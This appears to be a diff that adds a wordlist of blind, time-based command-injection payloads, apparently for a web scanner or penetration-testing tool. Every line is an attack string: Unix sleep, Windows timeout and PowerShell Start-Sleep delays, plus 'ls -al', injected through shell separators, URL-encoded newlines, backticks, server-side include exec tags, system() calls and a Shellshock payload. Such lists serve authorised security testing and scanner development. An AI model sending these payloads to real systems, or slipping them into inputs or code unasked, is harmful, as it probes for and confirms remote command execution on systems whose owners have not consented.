@@ -1,0 +1,154 @@
+&lt;!--#exec%20cmd=&quot;sleep 4;--&gt;
+/index.html|sleep 4|
+;sleep 4;
+;sleep 4
+;sleep 4;
+|sleep 4
+|/usr/bin/sleep 4
+|sleep 4|
+|/usr/bin/sleep 4|
+||/usr/bin/sleep 4|
+|sleep 4;
+||/usr/bin/sleep 4;
+<!--#exec cmd="/usr/bin/sleep 4;-->
+;sleep 4|
+;|/usr/bin/sleep 4|
+\n/bin/ls -al\n
+\n/usr/bin/sleep 4\n
+\nsleep 4\n
+\n/usr/bin/sleep 4;
+\nsleep 4;
+\n/usr/bin/sleep 4|
+\nsleep 4|
+;/usr/bin/sleep 4\n
+;sleep 4\n
+|usr/bin/sleep 4\n
+&& sleep 4\n
+`sleep 4`
+`/usr/bin/sleep 4`
+a);sleep 4
+a;sleep 4
+a);sleep 4;
+a;sleep 4;
+a);sleep 4|
+a;sleep 4|
+a && sleep 4|
+a)|sleep 4
+a) && sleep 4
+a|sleep 4
+a)|sleep 4;
+a|sleep 4
+a);/usr/bin/sleep 4
+a;/usr/bin/sleep 4
+a);/usr/bin/sleep 4;
+a;/usr/bin/sleep 4;
+a);/usr/bin/sleep 4|
+a;/usr/bin/sleep 4|
+a)|/usr/bin/sleep 4
+a|/usr/bin/sleep 4
+a)|/usr/bin/sleep 4;
+a|/usr/bin/sleep 4
+;system('sleep 4')
+;system('/usr/bin/sleep 4')
+%0A/usr/bin/sleep 4
+%0Asleep 4
+%0A/usr/bin/sleep 4%0A
+%0Asleep 4%0A
+| sleep 4
+& sleep 4
+; sleep 4
+%0a sleep 4 %0a
+`sleep 4`
+$;/usr/bin/sleep 4
+() { :;}; /bin/bash -c "sleep 4 && echo vulnerable 4"
+&lt;!--#exec%20cmd=&quot;timeout 4;--&gt;
+/index.html|timeout 4|
+;timeout 4;
+;timeout 4
+;timeout 4;
+|timeout 4
+|C:\Windows\System32\timeout.exe 4
+|timeout 4|
+|C:\Windows\System32\timeout.exe 4|
+||C:\Windows\System32\timeout.exe 4|
+|timeout 4;
+||C:\Windows\System32\timeout.exe 4;
+<!--#exec cmd="C:\Windows\System32\timeout.exe 4;-->
+;timeout 4|
+;|C:\Windows\System32\timeout.exe 4|
+\n/bin/ls -al\n
+\nC:\Windows\System32\timeout.exe 4\n
+\ntimeout 4\n
+\nC:\Windows\System32\timeout.exe 4;
+\ntimeout 4;
+\nC:\Windows\System32\timeout.exe 4|
+\ntimeout 4|
+;C:\Windows\System32\timeout.exe 4\n
+;timeout 4\n
+|usr/bin/timeout 4\n
+|ntimeout 4\n
+a);timeout 4
+a;timeout 4
+a);timeout 4;
+a;timeout 4;
+a);timeout 4|
+a;timeout 4|
+a)|timeout 4
+a|timeout 4
+a)|timeout 4;
+a|timeout 4
+a);C:\Windows\System32\timeout.exe 4
+a;C:\Windows\System32\timeout.exe 4
+a);C:\Windows\System32\timeout.exe 4;
+a;C:\Windows\System32\timeout.exe 4;
+a);C:\Windows\System32\timeout.exe 4|
+a;C:\Windows\System32\timeout.exe 4|
+a)|C:\Windows\System32\timeout.exe 4
+a|C:\Windows\System32\timeout.exe 4
+a)|C:\Windows\System32\timeout.exe 4;
+a|C:\Windows\System32\timeout.exe 4
+;system('timeout 4')
+;system('C:\Windows\System32\timeout.exe 4')
+%0AC:\Windows\System32\timeout.exe 4
+%0Atimeout 4
+%0AC:\Windows\System32\timeout.exe 4%0A
+%0Atimeout 4%0A
+| timeout 4
+& timeout 4
+; timeout 4
+%0a timeout 4 %0a
+$;C:\Windows\System32\timeout.exe 4
+&& FOR /F "delims=" %i IN ('timeout 4') DO echo 1
+& FOR /F "delims=" %i IN ('timeout 4') DO echo 1
+&lt;!--#exec%20cmd=&quot;Start-Sleep -s 4;--&gt;
+/index.html|Start-Sleep -s 4|
+;Start-Sleep -s 4;
+;Start-Sleep -s 4
+;Start-Sleep -s 4;
+|Start-Sleep -s 4
+|Start-Sleep -s 4|
+|Start-Sleep -s 4;
+;Start-Sleep -s 4|
+\n/bin/ls -al\n
+\nStart-Sleep -s 4\n
+\nStart-Sleep -s 4;
+\nStart-Sleep -s 4|
+;Start-Sleep -s 4\n
+|nStart-Sleep -s 4\n
+a);Start-Sleep -s 4
+a;Start-Sleep -s 4
+a);Start-Sleep -s 4;
+a;Start-Sleep -s 4;
+a);Start-Sleep -s 4|
+a;Start-Sleep -s 4|
+a)|Start-Sleep -s 4
+a|Start-Sleep -s 4
+a)|Start-Sleep -s 4;
+a|Start-Sleep -s 4
+;system('Start-Sleep -s 4')
+%0AStart-Sleep -s 4
+%0AStart-Sleep -s 4%0A
+| Start-Sleep -s 4
+& Start-Sleep -s 4
+; Start-Sleep -s 4
+%0a Start-Sleep -s 4 %0a
